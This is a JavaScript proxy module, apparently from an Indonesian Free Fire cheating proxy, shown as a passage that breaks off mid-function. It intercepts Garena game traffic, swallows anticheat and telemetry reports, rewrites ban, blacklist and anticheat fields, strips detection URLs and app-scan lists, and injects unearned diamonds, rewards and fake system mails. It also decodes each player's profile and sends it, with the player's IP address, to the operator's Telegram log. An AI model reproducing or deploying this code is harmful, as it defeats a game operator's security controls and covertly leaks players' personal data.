// modules/proxy.js - FORWARD + TELEMETRY SPOOF
const { createProxyMiddleware } = require('http-proxy-middleware');
const { MY_IP } = require('../gamevar');
const zlib   = require('zlib');
const tglog  = require('./tglog');
const pb     = require('./protobuf');
const skin   = require('./skin');

const GARENA_LOGIN_SERVER  = 'https://loginbp.ggpolarbear.com';
const GARENA_CLIENT_SERVER = 'https://clientbp.ggpolarbear.com';

// Path yang tidak boleh di-forward ke upstream — harus di-spoof di sini
// (endpoint ini kadang datang lewat catch-all proxy bukan route spesifik)
// PATCH: Ditambahkan semua GIN/GGP TCP endpoints + anticheat data paths.
const TELEMETRY_PATHS = [
    '/LogEvent',
    '/ReportEventPushInfo',
    '/CheckHackBehavior',
    '/CheckNeedUpdateGPToken',
    '/GinReport', '/gin/report', '/gin/connect', '/gin/keepalive',
    '/gin/disconnect', '/gin/upload', '/gin/batch',
    '/GGP', '/GGPReport', '/ggp/report', '/ggp/connect',
    '/ggp/keepalive', '/ggp/upload',
    '/AntiAddiction', '/ReportAntiAddiction',
    '/AnticheatReport', '/anticheat/report', '/anticheat/upload',
    '/AnticheatUpload', '/CheckHackData', '/ReportHackData',
    '/ReportClientData', '/ClientDataForward',
    '/SecurityReport', '/ReportSecurityEvent',
    '/DataReport', '/DataUploadEvent',
    // Network telemetry — berisi country:BR dari ver.php lama, jangan forward ke Garena
    '/api/network_log', '/network_log', '/networklog',
    '/api/logNetworkLogEvent', '/logNetworkLogEvent',
];

function isTelemetryPath(path) {
    const lower = path.toLowerCase();
    if (TELEMETRY_PATHS.some(p => path === p || path.startsWith(p + '?'))) return true;
    return (
        lower.includes('logevent') ||
        lower.includes('networklog') ||
        lower.includes('reportevent') ||
        lower.includes('antiaddiction') ||
        lower.includes('anticheat') ||
        lower.includes('hackdata') ||
        lower.includes('clientdata') ||
        lower.includes('dataforward') ||
        lower.includes('securityreport') ||
        lower.includes('ginreport') ||
        lower.includes('ggpreport') ||
        lower.includes('ginupload') ||
        lower.includes('ggpupload') ||
        lower.includes('/gin/') ||
        lower.includes('/ggp/') ||
        (lower.includes('report') && lower.includes('event'))
    );
}

function sendSpoofOK(res, isBinary) {
    if (isBinary) {
        res.writeHead(200, { 'Content-Type': 'application/octet-stream', 'Content-Length': '0' });
        res.end();
    } else {
        const body = JSON.stringify({ code: 0, message: 'ok' });
        res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) });
        res.end(body);
    }
}

// ===== BAN PATCH =====
// Patch field AEBBNFBNIDB di JSON response clientbp
// Supaya ban_mode=0, unban_time=0, hint_string="" → game ga nge-ban user
const BAN_INFO_KEY = 'AEBBNFBNIDB';

function patchBanInfo(jsonObj) {
    // Patch AEBBNFBNIDB (GetLoginData ban_mode)
    if (jsonObj && typeof jsonObj[BAN_INFO_KEY] === 'object' && jsonObj[BAN_INFO_KEY] !== null) {
        const banInfo = jsonObj[BAN_INFO_KEY];
        const before = { ban_mode: banInfo.ban_mode, unban_time: banInfo.unban_time, hint_string: banInfo.hint_string };
        banInfo.ban_mode    = 0;
        banInfo.unban_time  = 0;
        banInfo.hint_string = '';
        console.log(`[BAN-PATCH] AEBBNFBNIDB patched: ${JSON.stringify(before)} → ban_mode:0 unban_time:0 hint_string:""`);
    }

    // ===== MATCHMAKING BLACKLIST PATCH =====
    // Dari BackendLog: GetMatchmakingBlacklist response punya format:
    //   { "blacklist": [], "blacklist_info": null }
    // BL bisa datang dari dua arah:
    //   1. blacklist[] array → berisi list player yang di-BL
    //   2. blacklist_info object → info BL user sendiri
    // Keduanya harus di-zero-out supaya game tidak enforce BL.
    if (jsonObj && Array.isArray(jsonObj.blacklist)) {
        if (jsonObj.blacklist.length > 0) {
            console.log(`[BL-PATCH] blacklist[] cleared: ${jsonObj.blacklist.length} entries`);
        }
        jsonObj.blacklist = [];
    }
    if (jsonObj && jsonObj.blacklist_info !== undefined && jsonObj.blacklist_info !== null) {
        console.log('[BL-PATCH] blacklist_info cleared');
        jsonObj.blacklist_info = null;
    }

    // PATCH: spoof matchmaking blacklist (GetMatchmakingBlacklist response)
    // Struktur: { blacklist_list: [{ blacklist: { is_in_blacklist, ban_time, ban_reason, ... } }] }
    // dan nested blacklist di tiap player entry di GetLoginData response
    function zapBlacklist(obj, depth) {
        if (!obj || typeof obj !== 'object' || depth > 10) return;
        if (Array.isArray(obj)) { obj.forEach(i => zapBlacklist(i, depth + 1)); return; }
        // is_in_blacklist: bool field
        if ('is_in_blacklist' in obj) {
            const before = obj.is_in_blacklist;
            obj.is_in_blacklist     = false;
            obj.ban_time            = 0;
            obj.ban_reason          = 0;
            obj.ban_reason_detail   = '';
            obj.ban_expire_duration = 0;
            obj.ban_type            = '';
            if (before) console.log(`[BL-PATCH] is_in_blacklist → false`);
        }
        // matchmaking_blacklist: int (0=clean, >0=blacklisted) ATAU nested object
        if ('matchmaking_blacklist' in obj) {
            const mbl = obj.matchmaking_blacklist;
            if (typeof mbl === 'number' && mbl !== 0) {
                console.log(`[BL-PATCH] matchmaking_blacklist (int) ${mbl} → 0`);
                obj.matchmaking_blacklist = 0;
            } else if (mbl && typeof mbl === 'object') {
                if (mbl.is_in_blacklist) {
                    console.log(`[BL-PATCH] matchmaking_blacklist.is_in_blacklist → false`);
                    mbl.is_in_blacklist = false;
                    if (mbl.ban_time            !== undefined) mbl.ban_time            = 0;
                    if (mbl.ban_reason          !== undefined) mbl.ban_reason          = 0;
                    if (mbl.ban_reason_detail   !== undefined) mbl.ban_reason_detail   = '';
                    if (mbl.ban_expire_duration !== undefined) mbl.ban_expire_duration = 0;
                    if (mbl.ban_type            !== undefined) mbl.ban_type            = '';
                }
            }
        }
        // championship BL
        if ('championship_is_in_blacklist' in obj && obj.championship_is_in_blacklist) {
            obj.championship_is_in_blacklist = false;
            console.log('[BL-PATCH] championship_is_in_blacklist → false');
        }
        // ban_time standalone field
        if ('ban_time' in obj && typeof obj.ban_time === 'number' && obj.ban_time > 0) {
            // Hanya zero-out kalau ada BL indicator di object yang sama
            if ('ban_reason' in obj || 'is_in_blacklist' in obj) {
                console.log(`[BL-PATCH] ban_time ${obj.ban_time} → 0`);
                obj.ban_time = 0;
                if (obj.ban_reason !== undefined) obj.ban_reason = 0;
            }
        }
        for (const k of Object.keys(obj)) zapBlacklist(obj[k], depth + 1);
    }
    zapBlacklist(jsonObj, 0);

    return jsonObj;
}

// ===== DEDICATED GetMatchmakingBlacklist PATCH =====
// Intercept response sebelum dikirim ke game dan pastikan selalu bersih
function patchMatchmakingBL(jsonObj, urlPath) {
    if (!urlPath.includes('GetMatchmakingBlacklist')) return jsonObj;
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;

    const before = { bl_len: (jsonObj.blacklist || []).length, info: jsonObj.blacklist_info };

    // Zero-out semua format BL yang mungkin
    jsonObj.blacklist      = [];
    jsonObj.blacklist_info = null;

    // Kalau ada format lain (blacklist_list, bl_list, dll)
    if (jsonObj.blacklist_list !== undefined) jsonObj.blacklist_list = [];
    if (jsonObj.bl_list        !== undefined) jsonObj.bl_list        = [];

    if (before.bl_len > 0 || before.info !== null) {
        console.log(`[BL-PATCH] GetMatchmakingBlacklist cleared: ${JSON.stringify(before)} → clean`);
    }
    return jsonObj;
}

// ===== GIN/GGP URL PATCH =====
// CECNLHCONMI adalah config GIN/GGP yang di-pass ke SDK setelah GetLoginData.
// GIN connect via TCP langsung ke gin.freefiremobile.com — tidak lewat HTTP proxy.
// Metode lama (edit field) masih bisa ter-bypass karena game mungkin ignore partial patch.
// Metode baru: DELETE field CECNLHCONMI sepenuhnya + recursive scan + string-level regex.
const GIN_CONFIG_KEY = 'CECNLHCONMI';
const GRTC_URL_KEY   = 'LJAPOJNBOFE'; // GRTC/SDK URL
const TRACEROUTE_KEY = 'FOGGNIHIBPG'; // IP traceroute list → matiin
const SERVERNODE_KEY = 'HDNAPFEGDGG'; // Server node list → matiin

// Regex untuk string-level fallback — match value JSON yang mengandung domain GIN
const _ginDomainPattern = new RegExp(
    '("(?:[^"\\\\]|\\\\.)*(?:' + [
        'gin\\.freefiremobile\\.com',
        'grtc\\.garenanow\\.com',
        'ggblueshark\\.com',
        'ffanti\\.',
        'ggpolarbear\\.com/gin',
        'ggpolarbear\\.com/ggp',
        '124\\.158\\.134\\.7',
        '124\\.158\\.135\\.168',
        'stronghold\\.freefiremobile\\.com',
        'vodka\\.freefiremobile\\.com',
        'idevent\\.gg',
        'idnetwork\\.gg',
        'sggigateway\\.gg',
        'gamesecurity\\.sea\\.freefiremobile\\.com',  // ban check URL — jangan sampai client hit ini
    ].join('|') + ')(?:[^"\\\\]|\\\\.)*")',
    'gi'
);

function patchStringLevelGin(jsonStr) {
    const result = jsonStr.replace(_ginDomainPattern, '""');
    if (result !== jsonStr) {
        console.log('[STRING-PATCH] GIN/anticheat domain ditemukan dan dihapus di level string');
    }
    return result;
}

function removeKeyRecursive(obj, key, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) {
        // Masuk ke setiap elemen array
        for (const item of obj) {
            if (item && typeof item === 'object') removeKeyRecursive(item, key, depth + 1);
        }
        return;
    }
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
        delete obj[key];
        console.log(`[GIN-PATCH] ${key} DELETED (depth ${depth})`);
    }
    for (const k of Object.keys(obj)) {
        const val = obj[k];
        if (val && typeof val === 'object') removeKeyRecursive(val, key, depth + 1);
    }
}

function patchGinUrl(jsonObj) {
    // Hapus CECNLHCONMI sepenuhnya — lebih aman dari edit partial
    removeKeyRecursive(jsonObj, GIN_CONFIG_KEY, 0);

    // Kosongkan LJAPOJNBOFE (GRTC SDK URL)
    removeKeyRecursive(jsonObj, GRTC_URL_KEY, 0);

    // Hapus traceroute IP list (dipakai GIN untuk scan network)
    if (jsonObj && Array.isArray(jsonObj[TRACEROUTE_KEY])) {
        jsonObj[TRACEROUTE_KEY] = [];
        console.log('[GIN-PATCH] FOGGNIHIBPG (traceroute list) dikosongkan');
    }

    // Kosongkan server node list
    if (jsonObj && Array.isArray(jsonObj[SERVERNODE_KEY])) {
        jsonObj[SERVERNODE_KEY] = [];
        console.log('[GIN-PATCH] HDNAPFEGDGG (server node list) dikosongkan');
    }

    // Matiin field report lain yang mungkin ada di root level
    const KILL_FLAGS = [
        'POEPGJPHCMJ', // event URL
        'EMFPDECPCDG', // network URL
        'PDJHKBDIHGL', // gateway URL
        'IIPKMIOFCJP', // vodka URL
    ];
    for (const f of KILL_FLAGS) {
        if (jsonObj && jsonObj[f] !== undefined) {
            const old = jsonObj[f];
            jsonObj[f] = '';
            if (old) console.log(`[GIN-PATCH] ${f}: "${String(old).substring(0,40)}" → ""`);
        }
    }

    // Null-kan "hacker_protection" recursive — nilai 10 = full anticheat, 0 = disabled
    // FIX: sebelumnya lolos karena ada di dalam array protections[] — sekarang sudah handle array
    _zeroField(jsonObj, 'hacker_protection', 0, 0);
    // Null-kan "ut_flag" (GIN token flag) jika masih ada di nested field
    _zeroField(jsonObj, 'ut_flag', 0, 0);

    // ── Hapus android_apps_to_detect_res — list app scanner buat deteksi trainer/hack tools ──
    // Kalau dibiarkan, game scan package list device → bisa trigger "Abnormal Data" ban
    if (jsonObj && jsonObj['android_apps_to_detect_res'] !== undefined) {
        const apd = jsonObj['android_apps_to_detect_res'];
        if (apd && typeof apd === 'object' && !Array.isArray(apd)) {
            if (Array.isArray(apd['android_apps_to_detect_res'])) {
                apd['android_apps_to_detect_res'] = [];
            }
        } else if (Array.isArray(apd)) {
            jsonObj['android_apps_to_detect_res'] = [];
        }
        console.log('[GIN-PATCH] android_apps_to_detect_res dikosongkan');
    }

    // ── Matiin GGP/GIN flags di semua level nested ──
    _zeroField(jsonObj, 'is_report_to_ggp',   false, 0);
    _zeroField(jsonObj, 'is_enable_ggp',       false, 0);
    _zeroField(jsonObj, 'is_enable_tcp',       false, 0);
    _zeroField(jsonObj, 'is_transfer_report',  false, 0);
    _zeroField(jsonObj, 'is_get_feature',      false, 0);
    _zeroField(jsonObj, 'is_get_flag',         false, 0);
    _zeroField(jsonObj, 'ggp_url',             '',    0);

    // ── Patch anti_hack_center_desc — kosongkan ban_list_url + link gamesecurity ──
    // URL ini dipakai game buat nampilin halaman ban dan query status ban langsung ke Garena.
    // Kalau dibiarkan, client bisa tau status ban sebelum proxy sempat spoof AEBBNFBNIDB.
    const ahcd = jsonObj && jsonObj['anti_hack_center_desc'];
    if (ahcd && typeof ahcd === 'object') {
        // Struktur dari server: { anti_hack_center_desc: { link, ban_list_url, ... } }
        const inner = ahcd['anti_hack_center_desc'] || ahcd;
        if (inner && typeof inner === 'object') {
            if (inner['ban_list_url'] !== undefined) {
                console.log(`[GIN-PATCH] ban_list_url: "${inner['ban_list_url'].substring(0,50)}..." → ""`);
                inner['ban_list_url'] = '';
            }
            if (inner['link'] !== undefined) {
                console.log(`[GIN-PATCH] anti_hack link: "${String(inner['link']).substring(0,50)}..." → ""`);
                inner['link'] = '';
            }
        }
    }
    // Fallback: zero recursive kalau strukturnya beda di respons lain
    _zeroField(jsonObj, 'ban_list_url', '', 0);

    return jsonObj;
}

function _zeroField(obj, field, replacement, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return;
    if (Array.isArray(obj)) {
        // Masuk ke setiap elemen array (fix: Object.keys array hanya return index, bukan key objek di dalamnya)
        for (const item of obj) {
            if (item && typeof item === 'object') _zeroField(item, field, replacement, depth + 1);
        }
        return;
    }
    if (obj[field] !== undefined && obj[field] !== replacement) {
        console.log(`[GIN-PATCH] ${field}: ${JSON.stringify(obj[field])} → ${replacement}`);
        obj[field] = replacement;
    }
    for (const k of Object.keys(obj)) {
        const val = obj[k];
        if (val && typeof val === 'object') _zeroField(val, field, replacement, depth + 1);
    }
}


// ===== LOGIN REWARD PATCH =====
// Intercept GetCharacterRewardData & GetLoginReward response
// Tambahin diamonds + login reward supaya user dapet hadiah setiap login
const LOGIN_REWARD_ENDPOINTS = ['GetCharacterRewardData', 'GetLoginReward', 'GetDailyLogin'];

function isLoginRewardEndpoint(path) {
    return LOGIN_REWARD_ENDPOINTS.some(ep => path.includes(ep));
}

function patchLoginReward(jsonObj, path) {
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;

    // GetCharacterRewardData — tambahin diamonds ke coin_type 2 (diamonds)
    if (path.includes('GetCharacterRewardData')) {
        if (!Array.isArray(jsonObj.reward_list)) jsonObj.reward_list = [];
        const alreadyHasDiamond = jsonObj.reward_list.some(r => r.item_id === 800000303);
        if (!alreadyHasDiamond) {
            jsonObj.reward_list.unshift({
                item_id:   800000303,   // Diamond
                item_num:  100,
                item_type: 1,
                expire_time: 0
            });
            console.log(`[REWARD-PATCH] Injected 100 diamonds ke GetCharacterRewardData`);
        }
    }

    // GetLoginReward — force claimed = false supaya reward bisa diklaim
    if (path.includes('GetLoginReward')) {
        if (Array.isArray(jsonObj.reward_list)) {
            jsonObj.reward_list.forEach(r => {
                if (r.claimed !== undefined) r.claimed = false;
                if (r.is_claimed !== undefined) r.is_claimed = false;
            });
        }
        if (jsonObj.has_claimable !== undefined) jsonObj.has_claimable = true;
        if (jsonObj.can_claim !== undefined) jsonObj.can_claim = true;
        console.log(`[REWARD-PATCH] GetLoginReward forced claimable`);
    }

    return jsonObj;
}

// ===== MAIL INJECTION =====
// Inject mail custom ke GetMailList response supaya muncul di inbox pas login
const PROXY_HOST_URL = MY_IP.replace(/\/$/, '');

function buildFakeMail(id, title, content, gems = 0, coins = 0, items = []) {
    const now = Math.floor(Date.now() / 1000);
    return {
        HasRead: false,
        NeedHideLine: false,
        SubType: 0,
        Assist_Id: id,
        mail_id: id,
        type: 0,
        title,
        content,
        sender_info: {
            sender_id: 0, sender_nick: 'System', clan_id: 0, clan_name: '',
            clan_captain_id: 0, clan_captain_nick: '', season_id: 0, season_rank: 0,
            ep_unlock_id: 0, ep_challenge_id: 0, gift_message: '',
            global_drop: null, honor_delta: 0, subscription_ep_id: 0,
            championship_team_id: 0, championship_team_name: '', championship_type: 0,
            championship_id: 0, championship_trial_pos: 0, region: '',
            championship_name: '', limitedevent_leaderboard_type: 0,
            limitedevent_rank: 0, rank_master_level: 0, recharge_time: 0,
            recharge_points: 0, periodic_ranking_game_mode: 0,
            match_ban_expire_time: 0, deliver_info: null, pve_info: null,
            creditscore_well_behavior_days: 0, workshop_name: '',
            workshop_leaderboard_name: '', workshop_leaderboard_rank: 0,
            workshop_map_reward_id: 0, friend_intimacy_add: 0,
            workshop_code: '', account_id: 0, nick_name: '',
            credit_punish_duration: 0, credit_punish_type: 0,
            credit_punish_sub_type: 0, effective_start_time: 0,
            effective_end_time: 0, summary_lv_before: 0, summary_lv_after: 0,
            guild_war_hacker_punishment: null, esports_mail_info: null,
            workshop_short_code: '', ugc_token_amount: 0
        },
        attachment: {
            rewards: {
                items,
                coins,
                gems,
                exps: 0,
                activeness: 0,
                accelerators: 0,
                like_items: [],
                active_points: 0,
                hippo_items: [],
                hippo_money: 0
            }
        },
        receive_time: now,
        status: 0,
        source: 1,
        action_type: 0,
        release_version: 'OB54',
        cdn_url: '',
        go_pos: 0,
        sub_go_pos: '',
        expire_time: now + 604800,  // 7 hari
        local_mail_id: null,
        HasAddDataToRead: false
    };
}

// Mail-mail yang diinject setiap login
const INJECTED_MAILS = [
    buildFakeMail(
        9000000001,
        '🎁 Selamat Datang! Hadiah Login Harian',
        'Hai Survivor!\n\nIni hadiah login harian spesial untukmu. Semangat main ya! 💪\n\nSalam Booyah! 🔥',
        50,    // 50 gems/diamond
        5000,  // 5000 coins
        [
            { item_id: 800000303, item_num: 50,  item_type: 1, expire_time: 0 },  // 50 diamonds
            { item_id: 500000003, item_num: 1,   item_type: 1, expire_time: 0 },  // skin item
        ]
    ),
    buildFakeMail(
        9000000002,
        '⚡ Notifikasi Sistem Proxy',
        `[B22222]Proxy aktif dan berjalan![/B22222]\n\nSemua request sudah diproteksi.\nVersi proxy: v2.0 | Status: Online\nIP Proxy: ${PROXY_HOST_URL}\n\nEnjoy gaming! 🎮`,
        0, 0, []
    ),
    buildFakeMail(
        9000000003,
        '🛡️ Anti-Ban Protection Active',
        'Sistem anti-ban sudah aktif.\n\n✅ GGP/Gin disabled\n✅ CheckHack blocked\n✅ Telemetry blocked\n✅ Ban mode = 0\n\nHave fun!',
        0, 0,
        [
            { item_id: 800000301, item_num: 100, item_type: 1, expire_time: 0 }, // coins
        ]
    ),
];

function patchMailList(jsonObj, path) {
    if (!path.includes('GetMailList')) return jsonObj;
    if (!jsonObj || typeof jsonObj !== 'object') return jsonObj;

    if (!Array.isArray(jsonObj.mails)) jsonObj.mails = [];

    // Inject hanya jika belum ada (cek by mail_id)
    const existingIds = new Set(jsonObj.mails.map(m => m.mail_id));
    let injected = 0;
    for (const mail of INJECTED_MAILS) {
        if (!existingIds.has(mail.mail_id)) {
            jsonObj.mails.unshift(mail);
            injected++;
        }
    }

    if (injected > 0) console.log(`[MAIL-PATCH] Injected ${injected} mail(s) ke GetMailList`);
    return jsonObj;
}

// ===== IMAGE URL PATCH =====
// Replace semua URL gambar Garena ke proxy kita sendiri
// supaya asset di-serve dari proxy dan ga ada leak ke server Garena
const GARENA_IMG_DOMAINS = [
    'https://dl.bs.freefiremobile.com',
    'https://dl.dir.freefiremobile.com',
    'https://dl.cdn.freefiremobile.com',
    'https://dl.ak.freefiremobile.com',
    'https://dl.gmc.freefiremobile.com',
    'https://core-bs.freefiremobile.com',
    'https://core-gmc.freefiremobile.com',
];

function patchImageUrls(jsonStr) {
    let patched = jsonStr;
    for (const domain of GARENA_IMG_DOMAINS) {
        // Replace domain ke proxy CDN path
        patched = patched.split(domain).join(`${PROXY_HOST_URL}/cdn`);
    }
    return patched;
}

// ===== ACCOUNT INFO → TELEGRAM =====
const RANK_MAP = {
    0: 'Bronze', 1: 'Bronze I', 2: 'Bronze II', 3: 'Bronze III',
    4: 'Silver I', 5: 'Silver II', 6: 'Silver III',
    7: 'Gold I', 8: 'Gold II', 9: 'Gold III',
    10: 'Platinum I', 11: 'Platinum II', 12: 'Platinum III',
    13: 'Diamond I', 14: 'Diamond II', 15: 'Diamond III',
    16: 'Heroic', 17: 'Grandmaster'
};
function rankName(r) { return RANK_MAP[r] || `Rank ${r}`; }

function sendAccountInfoToTG(obj, clientIp) {
    try {
        const basic  = obj.basicInfo  || obj.basic_info  || {};
        const clan   = obj.clanBasicInfo || obj.clan_basic_info || {};
        const social = obj.socialInfo || obj.social_info || {};
        const pet    = obj.petInfo    || obj.pet_info    || {};
        const credit = obj.creditScoreInfo || obj.credit_score_info || {};

        const nick     = basic.nickname  || '?';
        const uid      = basic.accountId || basic.account_id || '?';
        const level    = basic.level     || 0;
        const exp      = basic.exp       || 0;
        const liked    = basic.liked     || 0;
        const region   = basic.region    || '?';
        const brRank   = rankName(basic.rank   || 0);
        const csRank   = rankName(basic.csRank || basic.cs_rank || 0);
        const badgeCnt = basic.badgeCnt  || basic.badge_cnt || 0;

        const sig      = social.signature || '-';
        const lang     = social.language  || '-';
        const gender   = social.gender === 1 ? 'Male' : social.gender === 2 ? 'Female' : '-';
        const mode     = social.modePrefer || social.mode_prefer || '-';

        const clanName = clan.clanName  || clan.clan_name  || '-';
        const clanId   = clan.clanId    || clan.clan_id    || '-';
        const clanLvl  = clan.clanLevel || clan.clan_level || '-';

        const petName  = pet.name  || '-';
        const petLevel = pet.level || 0;

        const creditScore = credit.creditScore || credit.credit_score || '-';

        const lastLogin = basic.lastLoginAt || basic.last_login_at;
        const createdAt = basic.createAt    || basic.create_at;
        const lastLoginStr = lastLogin ? new Date(Number(lastLogin) * 1000).toISOString().replace('T', ' ').slice(0, 16) + ' UTC' : '-';
        const createdStr   = createdAt  ? new Date(Number(createdAt)  * 1000).toISOString().replace('T', ' ').slice(0, 16) + ' UTC' : '-';

        const lines = [
            `👤 <b>Account Info</b>`,
            ``,
            `🏷 Nama: <b>${nick}</b>`,
            `🆔 UID: <code>${uid}</code>`,
            `🌏 Region: ${region}`,
            `⭐ Level: ${level} (EXP: ${exp})`,
            `❤️ Likes: ${liked}`,
            `🏅 BR Rank: ${brRank}`,
            `🎯 CS Rank: ${csRank}`,
            `🏆 BP Badges: ${badgeCnt}`,
            `💳 Credit Score: ${creditScore}`,
            ``,
            `👤 Gender: ${gender}`,
            `🗣 Bahasa: ${lang}`,
            `🎮 Mode Favorit: ${mode}`,
            `✏️ Signature: ${sig}`,
            ``,
            `🐾 Pet: ${petName} (Lv.${petLevel})`,
            ``,
            `🏰 Guild: ${clanName} (ID: ${clanId}, Lv.${clanLvl})`,
            ``,
            `📅 Dibuat: ${createdStr}`,
            `🕐 Last Login: ${lastLoginStr}`,
            `🌐 IP: ${clientIp}`,
        ];
        tglog.send(lines.join('\n'));
    } catch (e) {
        console.log('[PROXY] sendAccountInfoToTG error:', e.message);
    }
}

function collectResponseBody(proxyRes) {
    return new Promise((resolve, reject) => {
        const encoding = proxyRes.headers['content-encoding'];
        const chunks = [];
        let stream = proxyRes;
        if (encoding === 'gzip') stream = proxyRes.pipe(zlib.createGunzip());
        else if (encoding === 'deflate') stream = proxyRes.pipe(zlib.createInflate());
        else if (encoding === 'br') stream = proxyRes.pipe(zlib.createBrotliDecompress());
        stream.on('data', chunk => chunks.push(chunk));
        stream.on('end',  ()    => resolve(Buffer.concat(chunks)));
        stream.on('error', err => {
            console.log('[PROXY] Decompress error (' + encoding + '): ' + err.message);
            const raw = [];
            proxyRes.on('data', c => raw.push(c));
            proxyRes.on('end', () => resolve(Buffer.concat(raw)));
            proxyRes.on('error', reject);
        });
    });
}

// Intercept response clientbp dan patch ban info sebelum dikirim ke game
function createClientProxyWithBanPatch() {
    return createProxyMiddleware({
        target: GARENA_CLIENT_SERVER,
        changeOrigin: true,
        secure: false,
        selfHandleResponse: true,   // kita handle sendiri responsenya
        onProxyReq: (proxyReq, req, res) => {
            const host = new URL(GARENA_CLIENT_SERVER).host;
            proxyReq.setHeader('Host', host);
            proxyReq.setHeader('Origin', GARENA_CLIENT_SERVER);

            if (req.headers['user-agent'])       proxyReq.setHeader('User-Agent',       req.headers['user-agent']);
            if (req.headers['accept-language'])  proxyReq.setHeader('Accept-Language',  req.headers['accept-language']);
            if (req.headers['accept-encoding'])  proxyReq.setHeader('Accept-Encoding',  req.headers['accept-encoding']);
            if (req.headers['accept'])           proxyReq.setHeader('Accept',           req.headers['accept']);
            if (req.headers['content-type'])     proxyReq.setHeader('Content-Type',     req.headers['content-type']);

            if (Buffer.isBuffer(req.body) && req.body.length > 0) {
                proxyReq.setHeader('Content-Length', req.body.length);
                proxyReq.write(req.body);
            }
        },
        onProxyRes: async (proxyRes, req, res) => {
            const statusCode  = proxyRes.statusCode;
            const contentType = proxyRes.headers['content-type'] || '';

            // Kopi semua header dari upstream ke response, minus content-encoding & content-length
            // (kita bakal set ulang content-length setelah patch)
            const headers = Object.assign({}, proxyRes.headers);
            delete headers['content-encoding'];
            delete headers['content-length'];
            delete headers['transfer-encoding'];

            try {
                const rawBody = await collectResponseBody(proxyRes);

                // Coba patch kalau JSON
                if (contentType.includes('application/json')) {
                    let parsed;
                    try { parsed = JSON.parse(rawBody.toString('utf8')); } catch (_) { parsed = null; }

                    if (parsed && typeof parsed === 'object') {
                        patchBanInfo(parsed);
                        patchMatchmakingBL(parsed, req.url || '');   // ← dedicated BL patch
                        patchGinUrl(parsed);
                        patchMailList(parsed, req.url || '');
                        if (isLoginRewardEndpoint(req.url || '')) {
                            patchLoginReward(parsed, req.url || '');
                        }
                        // Inject skin/emote/avatar/clothes/weapon IDs
                        skin.patchSkinData(parsed, req.url || '');
                        // Patch URL gambar di JSON string setelah semua object patch
                        let jsonStr = patchImageUrls(JSON.stringify(parsed));
                        // String-level fallback — catch domain GIN yang mungkin masih tersisa
                        jsonStr = patchStringLevelGin(jsonStr);
                        const patched = Buffer.from(jsonStr, 'utf8');
                        headers['content-length'] = String(patched.length);
                        res.writeHead(statusCode, headers);
                        res.end(patched);
                        console.log(`[CLIENT-PATCH] ${statusCode} ${req.method} ${req.url}`);
                        return;
                    }
                }

                // Intercept GetPlayerPersonalShow — decode protobuf → TG
                const urlPath = req.url || '';
                if (urlPath.includes('GetPlayerPersonalShow') && pb.isLoaded && rawBody.length > 0) {
                    try {
                        const rawIp    = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
                        const clientIp = rawIp.split(',')[0].trim().replace('::ffff:', '');
                        const decoded  = pb.AccountPersonalShowInfo.decode(rawBody);
                        const obj      = pb.AccountPersonalShowInfo.toObject(decoded, {
                            longs: String, enums: String, bytes: String, defaults: true
                        });
                        sendAccountInfoToTG(obj, clientIp);
                    } catch (e) {
                        console.log('[PROXY] PersonalShow decode error:', e.message);
                    }
                }

                // Bukan JSON atau parse gagal — kirim apa adanya
                headers['content-length'] = String(rawBody.length);
                res.writeHead(statusCode, headers);
                res.end(rawBody);
                console.log(`[CLIENT] ${statusCode} ${req.method} ${req.url}`);

            } catch (err) {
                console.log(`[CLIENT] body collect error: ${err.message}`);
                if (!res.headersSent) res.writeHead(502);
                res.end();
            }
        },
        onError: (err, req, res) => {
            console.log(`[CLIENT] ERROR: ${err.message}`);
            if (!res.headersSent) res.status(502).json({ code: 502, message: 'Proxy error' });
        }
    });
}

// ===== CDN DI-HANDLE OLEH modules/cdn.js =====

// ===== NICKNAME FALLBACK GENERATOR =====
// Kalau GenerateNickname dari server return 500 / error, generate nama ID-valid sendiri
const NICK_PREFIXES = ['Jagoan','Pendekar','Sniper','Sultan','Gatotkaca','Booyah','Survivor','Pejuang','Garuda','Naga'];
const NICK_SUFFIXES = ['FF','GG','MAX','Pro','ID','Hebat','Keren','Jago'];
function generateFallbackNickname() {
    const p = NICK_PREFIXES[Math.floor(Math.random() * NICK_PREFIXES.length)];
    const s = NICK_SUFFIXES[Math.floor(Math.random() * NICK_SUFFIXES.length)];
    const n = Math.floor(100 + Math.random() * 900);
    return `${p}${s}${n}`;
}

// ===== LOGIN PROXY (loginbp) =====
// Intercept GenerateNickname 500 error → fallback ke nama lokal yang valid untuk region ID
// Intercept MajorRegister 400 BR_ACCOUNT_INVALID_NAME → retry dengan nama yang valid
const loginProxy = createProxyMiddleware({
    target: GARENA_LOGIN_SERVER,
    changeOrigin: true,
    secure: false,
    selfHandleResponse: true,   // kita handle response sendiri supaya bisa patch
    onProxyReq: (proxyReq, req, res) => {
        const host = new URL(GARENA_LOGIN_SERVER).host;
        proxyReq.setHeader('Host', host);
        proxyReq.setHeader('Origin', GARENA_LOGIN_SERVER);

        if (req.headers['user-agent'])       proxyReq.setHeader('User-Agent', req.headers['user-agent']);
        if (req.headers['accept-language'])  proxyReq.setHeader('Accept-Language', req.headers['accept-language']);
        if (req.headers['accept-encoding'])  proxyReq.setHeader('Accept-Encoding', req.headers['accept-encoding']);
        if (req.headers['accept'])           proxyReq.setHeader('Accept', req.headers['accept']);
        if (req.headers['connection'])       proxyReq.setHeader('Connection', req.headers['connection']);
        if (req.headers['content-type'])     proxyReq.setHeader('Content-Type', req.headers['content-type']);

        if (Buffer.isBuffer(req.body) && req.body.length > 0) {
            proxyReq.setHeader('Content-Length', req.body.length);
            proxyReq.write(req.body);
        }
    },
    onProxyRes: (proxyRes, req, res) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => {
            const raw = Buffer.concat(chunks);
            const statusCode = proxyRes.statusCode;
            const ct = (proxyRes.headers['content-type'] || '').toLowerCase();
            const isJson = ct.includes('application/json') || ct.includes('text/');

            console.log(`[LOGIN] ${statusCode} ${req.method} ${req.path}`);

            // ── GenerateNickname 500 → fallback nickname ──
            if (req.path === '/GenerateNickname' && statusCode >= 400) {
                const fallback = generateFallbackNickname();
